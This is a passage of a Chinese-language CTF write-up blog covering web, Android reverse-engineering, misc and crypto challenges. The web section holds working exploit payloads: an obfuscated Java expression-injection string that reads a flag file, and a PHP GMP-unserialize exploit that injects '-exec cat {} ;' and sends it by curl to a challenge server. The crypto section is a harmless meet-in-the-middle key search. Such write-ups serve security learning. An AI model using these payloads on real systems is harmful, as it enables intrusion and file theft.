101&#125;)))).next() &#125;]]</span></span><br><span class="line"></span><br><span class="line">    uuid = res.text[res.text.find(<span class="string">'./render/'</span>)+len(<span class="string">'./render/'</span>):res.text.find(<span class="string">'./render/'</span>)+len(<span class="string">'./render/2b32ce0c2a9292af4fdfe3333058c02c'</span>)]</span><br><span class="line"></span><br><span class="line">    res = sess.get(<span class="string">f'http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/render/<span class="subst">&#123;uuid&#125;</span>'</span>)</span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure><p>æœ€åç”¨ Scanner è¿™ä¸ªç±»ï¼Œæ–¹æ³•åé‡Œé¢æ²¡æœ‰ readï¼Œ payload å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[$&#123; (new java.util.Scanner(T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]&#123;106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101, 82, 101, 97, 100, 101, 114&#125;)).getConstructors()[0].newInstance(T(String).valueOf(new char[]&#123;47, 102, 108, 97, 103, 95, 105, 115, 95, 104, 101, 114, 101&#125;)))).next() &#125;]]</span><br></pre></td></tr></table></figure><h3 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h3><p>GMP çš„ä¸€ä¸ª CVEï¼Œç™¾åº¦å°±èƒ½æœåˆ°, å¯ä»¥è¦†ç›–ä»»æ„å¯¹è±¡çš„ä»»æ„å±æ€§. <a href="https://bugs.php.net/bug.php?id=70513" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=70513</a>.<br>è®¿é—® <a href="http://117.51.137.166/hint/hint.php" target="_blank" rel="noopener">http://117.51.137.166/hint/hint.php</a> æ‹¿åˆ°å‰åŠéƒ¨åˆ†<br>ç„¶åè¦†ç›– $mc çš„ flag å¯¼è‡´å‚æ•°æ³¨å…¥å°±èƒ½è¯»åˆ°ååŠéƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$inj = <span class="string">"-exec cat &#123;&#125; ;"</span>;</span><br><span class="line">$inner = <span class="string">'s:1:"3";a:3:&#123;s:4:"flag";s:'</span>.strlen($inj).<span class="string">':"'</span>.$inj.<span class="string">'";s:2:"hi";s:2:"aa";i:0;O:12:"DateInterval":1:&#123;s:1:"y";R:2;&#125;&#125;'</span>;</span><br><span class="line">$exploit = <span class="string">'a:1:&#123;i:0;C:3:"GMP":'</span>.strlen($inner).<span class="string">':&#123;'</span>.$inner.<span class="string">'&#125;&#125;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span> . $exploit . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$a = urlencode($exploit);</span><br><span class="line"></span><br><span class="line">system(<span class="string">"curl http://117.51.137.166/EOf9uk3nSsVFK1LQ.php?bullet=$a"</span>);</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Android-Reverse-1"><a href="#Android-Reverse-1" class="headerlink" title="Android Reverse 1"></a>Android Reverse 1</h3><p>ä¸€ä¸ªæœ‰ç‚¹ä¸å¤ªå¯¹åŠ²çš„AESå’Œteaç³»åˆ—åŠ å¯†ç®—æ³•åŠ ä¸€ä¸ªmd5ã€‚<br>è™½ç„¶aesä¸å¤ªå¯¹åŠ²ï¼Œä½†é¡ºç€aesåŠ å¯†å‡½æ•°ï¼Œåœ¨ä»–éš”å£æ‰¾åˆ°äº†aesçš„è§£å¯†å‡½æ•°ï¼Œç›´æ¥æŠŠåŠ å¯†hookæˆè§£å¯†å°±å¯ä»¥è§£å¯†ã€‚<br>arm64çš„soé‡Œçš„teaè§£å¯†éƒ¨åˆ†å¥½åƒè¢«ä¼˜åŒ–äº†ï¼Œæ‰€ä»¥å…ˆæŠŠapké‡æ‰“åŒ…ï¼Œæ‰”æ‰64ä½çš„soã€‚<br>32ä½çš„soé‡Œçš„teaåŠ å¯†ä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæœ‰ä¸€ä¸ªæ§åˆ¶åŠ å¯†çš„å‚æ•°8ï¼Œhookæ‰æŠŠ8æ”¹ä¸º-8ï¼Œå³å¯ä»¥è§£å¯†ã€‚<br>ç„¶åmd5éƒ¨åˆ†æ²¡åŠæ³•è§£ï¼Œé¡ºç€ç»™çš„æç¤ºå…ˆè§£teaï¼Œå†è§£AESï¼Œå°±å¯ä»¥æ‹¿åˆ°Flagã€‚</p><h3 id="Android-Reverse-2"><a href="#Android-Reverse-2" class="headerlink" title="Android Reverse 2"></a>Android Reverse 2</h3><p>å…ˆgithubæ‰¾ä¸ªè„šæœ¬ï¼Œæ¢å¤äº†Armaririsçš„å­—ç¬¦ä¸²ï¼Œç„¶åé¡ºç€æ‰¾åˆ°åŠ¨æ€æ³¨å†Œçš„å…³é”®å‡½æ•°ã€‚</p><p>åŒ…åå¦‚ç¬¬ä¸€é¢˜ï¼ŒçŒœæµ‹ç®—æ³•ä¹ŸåŸºæœ¬åŒç¬¬ä¸€é¢˜ï¼Œhookäº†ä¸€ä¸‹å‘ç°aesæ²¡å˜ï¼ŒteaåŠ å¯†å˜åŒ–äº†ï¼Œå¯èƒ½æ˜¯å¯†é’¥ä¹‹ç±»çš„å˜äº†ï¼Œä¸è¿‡æ²¡äº‹è¿˜æ˜¯å¯ä»¥ç›´æ¥Hookæ”¹å‚æ•°ã€‚<br>Frida-dexdumpç¡®è®¤äº†ä¸€ä¸‹ï¼ŒJavaå±‚å•¥éƒ½æ²¡æœ‰ã€‚</p><p>æ‰€ä»¥è¿˜æ˜¯ç›´æ¥HookåŠ å¯†æ”¹æˆè§£å¯†å°±å¯ä»¥å¾—åˆ°Flagã€‚</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="çœŸÂ·ç­¾åˆ°é¢˜"><a href="#çœŸÂ·ç­¾åˆ°é¢˜" class="headerlink" title="çœŸÂ·ç­¾åˆ°é¢˜"></a>çœŸÂ·ç­¾åˆ°é¢˜</h3><p>å…¬å‘Šæ¿é‡Œé¢æœ‰</p><h3 id="ä¸€èµ·æ‹¼å›¾å—"><a href="#ä¸€èµ·æ‹¼å›¾å—" class="headerlink" title="ä¸€èµ·æ‹¼å›¾å—"></a>ä¸€èµ·æ‹¼å›¾å—</h3><p>ChaMD5 ä¹‹å‰æœ‰ç±»ä¼¼çš„é¢˜ç›®ï¼Œgithub ä¸Šæœ‰è§£é¢˜è„šæœ¬ <a href="https://github.com/virink/puzzle_tool" target="_blank" rel="noopener">https://github.com/virink/puzzle_tool</a>, ç”¨æ¨¡å¼ 4 DiffRGB å°±èƒ½ç›´æ¥æ‹¼å›æ¥</p><h3 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h3><p>ä¸€å…± 5 ä¸ªè½®å¯†é’¥ï¼Œå…¶ä¸­å¾ˆæ˜æ˜¾å› ä¸ºåªæ˜¯å¼‚æˆ– + ä½ç§»çš„å…³ç³»ï¼Œ k3, k4 å¯ä»¥åˆå¹¶æˆä¸€ä¸ªï¼Œå®é™…ä¸Šæœ‰æ•ˆçš„æ˜¯ 4 ä¸ª 0-4096 çš„å¯†é’¥ï¼Œä½†æ˜¯ç©ºé—´è¿˜æ˜¯å¾ˆå¤§ï¼Œæ²¡åŠæ³•çˆ†ç ´ã€‚<br>è¿™é‡Œå¯ä»¥ç”¨ MITMï¼Œä¿å­˜ 4096 * 4096 ä¸ªçŠ¶æ€ï¼Œå°†çˆ†ç ´ç©ºé—´é™åˆ° 4096^3ï¼Œç”¨ cpp å†™äº†ä¸‹ï¼Œé€Ÿåº¦è¿˜æ˜¯æŒºå¿«çš„ï¼Œå‡ åˆ†é’Ÿèƒ½è·‘å®Œï¼Œ<br>é€‰å–ç»™çš„ plaintext å’Œ ciphertext çš„ç¬¬ä¸€ä¸ª bits æ¥çˆ†ç ´ï¼Œç„¶åç”¨åé¢çš„ 3 ä¸ªæ¥éªŒè¯ä¸‹æ˜¯å¦æ­£ç¡®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//int sbox0[] = å¤ªé•¿ä¸å¤åˆ¶äº†</span></span><br><span class="line"><span class="comment">//int sbox1[] =</span></span><br><span class="line"><span class="comment">//int rsbox0[] =</span></span><br><span class="line"><span class="comment">//int rsbox1[] =</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> NUM_BITS = <span class="number">12</span>;</span><br><span class="line"><span class="keyword">int</span> MAX_VALUE = (<span class="number">2</span> &lt;&lt; (NUM_BITS - <span class="number">1</span>));</span><br><span class="line"><span class="keyword">int</span> BIT_MASK = MAX_VALUE - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rol7</span><span class="params">(<span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((((b) &lt;&lt; <span class="number">7</span>) &amp; BIT_MASK) | (((b) &amp; BIT_MASK) &gt;&gt; (NUM_BITS - <span class="number">7</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ror7</span><span class="params">(<span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((((b) &amp; BIT_MASK) &gt;&gt; <span class="number">7</span>) | (((b) &lt;&lt; (NUM_BITS - <span class="number">7</span>)) &amp; BIT_MASK));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt_block</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> k0, <span class="keyword">int</span> k1, <span class="keyword">int</span> k2, <span class="keyword">int</span> k3, <span class="keyword">int</span> k4)</span> </span>&#123;</span><br><span class="line">    i = sbox0[sbox1[sbox0[(i &amp; BIT_MASK) ^ k0] ^ k1] ^ k2] ^ k3;</span><br><span class="line">    <span class="keyword">return</span> (ror7(i) ^ k4) &amp; BIT_MASK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt_block_simple</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> k0, <span class="keyword">int</span> k1, <span class="keyword">int</span> k2, <span class="keyword">int</span> kf)</span> </span>&#123;</span><br><span class="line">    i = sbox0[sbox1[sbox0[(i &amp; BIT_MASK) ^ k0] ^ k1] ^ k2];</span><br><span class="line">    i = i ^ kf;</span><br><span class="line">    <span class="keyword">return</span> (ror7(i)) &amp; BIT_MASK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decrypt_block</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> k0, <span class="keyword">int</span> k1, <span class="keyword">int</span> k2, <span class="keyword">int</span> k3, <span class="keyword">int</span> k4)</span> </span>&#123;</span><br><span class="line">    i = rol7((i &amp; BIT_MASK) ^ k4) ^ k3;</span><br><span class="line">    <span class="keyword">return</span> (rsbox0[rsbox1[rsbox0[i] ^ k2] ^ k1] ^ k0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decrypt_block_simple</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> k0, <span class="keyword">int</span> k1, <span class="keyword">int</span> k2, <span class="keyword">int</span> kf)</span> </span>&#123;</span><br><span class="line">    i = rol7((i &amp; BIT_MASK)) ^ kf;</span><br><span class="line">    <span class="keyword">return</span> (rsbox0[rsbox1[rsbox0[i] ^ k2] ^ k1] ^ k0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">merge_two</span><span class="params">(<span class="keyword">int</span> n1, <span class="keyword">int</span> n2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (n1 &lt;&lt; <span class="number">12</span>) | n2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; split_two(<span class="keyword">int</span> n) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::make_pair(n &gt;&gt; <span class="number">12</span>, n &amp; BIT_MASK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1092 -&gt; 2285</span></span><br><span class="line"><span class="comment">// k0, k1, k2, (k3 ^ k4) -&gt; kf</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; mid_status;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; keys;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4096</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">        tmp.reserve(<span class="number">4096</span>);</span><br><span class="line">        mid_status[i] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> plain = <span class="number">1079</span>;</span><br><span class="line">    <span class="keyword">int</span> cipher = <span class="number">567</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k0 = <span class="number">0</span>; k0 &lt; <span class="number">4096</span>; k0++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k1 = <span class="number">0</span>; k1 &lt; <span class="number">4096</span>; k1++) &#123;</span><br><span class="line">            <span class="keyword">int</span> merge = merge_two(k0, k1);</span><br><span class="line">            <span class="keyword">int</span> mid = sbox1[sbox0[plain ^ k0] ^ k1];</span><br><span class="line">            mid_status[mid].push_back(merge);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k2 = <span class="number">0</span>; k2 &lt; <span class="number">4096</span>; k2++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> kf = <span class="number">0</span>; kf &lt; <span class="number">4096</span>; kf++) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = rol7(cipher);</span><br><span class="line">            mid = mid ^ kf;</span><br><span class="line">            mid = rsbox0[mid];</span><br><span class="line">            mid = mid ^ k2;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> &amp;tgt : mid_status[mid]) &#123;</span><br><span class="line">                <span class="keyword">auto</span> splited = split_two(tgt);</span><br><span class="line">                <span class="keyword">int</span> k0 = splited.first;</span><br><span class="line">                <span class="keyword">int</span> k1 = splited.second;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (encrypt_block_simple(<span class="number">1079</span>, k0, k1, k2, kf) == <span class="number">567</span> &amp;&amp;</span><br><span class="line">                    encrypt_block_simple(<span class="number">633</span>, k0, k1, k2, kf) == <span class="number">361</span> &amp;&amp;</span><br><span class="line">                        encrypt_block_simple(<span class="number">1799</span>, k0, k1, k2, kf) == <span class="number">1793</span> &amp;&amp;</span><br><span class="line">                        encrypt_block_simple(<span class="number">1121</span>, k0, k1, k2, kf) == <span class="number">1001</span>) &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; k0 &lt;&lt; <span class="string">" "</span> &lt;&lt; k1 &lt;&lt; <span class="string">" "</span> &lt;&lt; k2 &lt;&lt; <span class="string">" "</span> &lt;&lt; kf &lt;&lt; <span class="string">" "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°ä¸¤ä¸ªç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3488 2863 726 1886</span><br><span class="line">934 1050 1509 3200</span><br></pre></td></tr></table></figure><p>æ”¹ä¸‹è„šæœ¬ç”¨åˆå¹¶çš„è½®å¯†é’¥æ¥è§£å¯†ï¼Œç¬¬ä¸€è¡Œé‚£å››ä¸ªå°±æ˜¯æ­£ç¡®çš„å¯†é’¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Define constant properties</span></span><br><span class="line">SECRET_KEYS = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]  <span class="comment"># DUMMY</span></span><br><span class="line">NUM_BITS = <span class="number">12</span></span><br><span class="line">BLOCK_SIZE_BITS = <span class="number">48</span></span><br><span class="line">BLOCK_SIZE = BLOCK_SIZE_BITS / <span class="number">8</span></span><br><span class="line">MAX_VALUE = (<span class="number">2</span> &lt;&lt; (NUM_BITS - <span class="number">1</span>))</span><br><span class="line">BIT_MASK = MAX_VALUE - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cipher</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, k0, k1, k2, kf)</span>:</span></span><br><span class="line">        self.k0 = k0</span><br><span class="line">        self.k1 = k1</span><br><span class="line">        self.k2 = k2</span><br><span class="line">        self.kf = kf</span><br><span class="line"></span><br><span class="line">        self._rand_start = <span class="number">0</span></span><br><span class="line">        self.sbox0, self.rsbox0 = self.generate_boxes(<span class="number">106</span>)</span><br><span class="line">        self.sbox1, self.rsbox1 = self.generate_boxes(<span class="number">81</span>)</span><br><span class="line">        <span class="keyword">print</span> self.sbox0</span><br><span class="line">        <span class="keyword">print</span> self.sbox1</span><br><span class="line">        <span class="keyword">print</span> self.rsbox0</span><br><span class="line">        <span class="keyword">print</span> self.rsbox1</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_srand</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self._rand_start = seed</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_rand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self._rand_start == <span class="number">0</span>:</span><br><span class="line">            self._rand_start = <span class="number">123459876</span></span><br><span class="line">        hi = self._rand_start / <span class="number">127773</span></span><br><span class="line">        lo = self._rand_start % <span class="number">127773</span></span><br><span class="line">        x = <span class="number">16807</span> * lo - <span class="number">2836</span> * hi</span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">            x += <span class="number">0x7fffffff</span></span><br><span class="line">        self._rand_start = (x % (<span class="number">0x7fffffff</span> + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> self._rand_start</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_boxes</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self.my_srand(seed)</span><br><span class="line">        sbox = range(MAX_VALUE)</span><br><span class="line">        rsbox = range(MAX_VALUE)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(MAX_VALUE):</span><br><span class="line">            r = self.my_rand() % MAX_VALUE</span><br><span class="line">            temp = sbox[i]</span><br><span class="line">            sbox[i] = sbox[r]</span><br><span class="line">            sbox[r] = temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(MAX_VALUE):</span><br><span class="line">            rsbox[sbox[i]] = i</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sbox, rsbox</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ror7</span><span class="params">(self, b)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> ((((b) &amp; BIT_MASK) &gt;&gt; <span class="number">7</span>) | (((b) &lt;&lt; (NUM_BITS - <span class="number">7</span>)) &amp; BIT_MASK))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rol7</span><span class="params">(self, b)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> ((((b) &lt;&lt; <span class="number">7</span>) &amp; BIT_MASK) | (((b) &amp; BIT_MASK) &gt;&gt; (NUM_BITS - <span class="number">7</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pad_string</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        num_blocks = len(s) / BLOCK_SIZE</span><br><span class="line">        num_remainder = len(s) % BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">        pad = (BLOCK_SIZE - num_remainder) % BLOCK_SIZE</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(BLOCK_SIZE - num_remainder):</span><br><span class="line">            s += chr(pad)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unpad_string</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        pad = ord(s[<span class="number">-1</span>]) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> pad == <span class="number">0</span> <span class="keyword">or</span> pad &gt; BLOCK_SIZE:</span><br><span class="line">            pad = BLOCK_SIZE</span><br><span class="line">        <span class="keyword">return</span> s[:-pad]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">string_to_bits_list</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        input_chars = s</span><br><span class="line">        num_blocks = len(s) / BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">        bits_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(num_blocks):</span><br><span class="line">            block = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> xrange(BLOCK_SIZE):</span><br><span class="line">                block = block &lt;&lt; <span class="number">8</span></span><br><span class="line">                block = block | ord(input_chars[i * BLOCK_SIZE + j])</span><br><span class="line">            <span 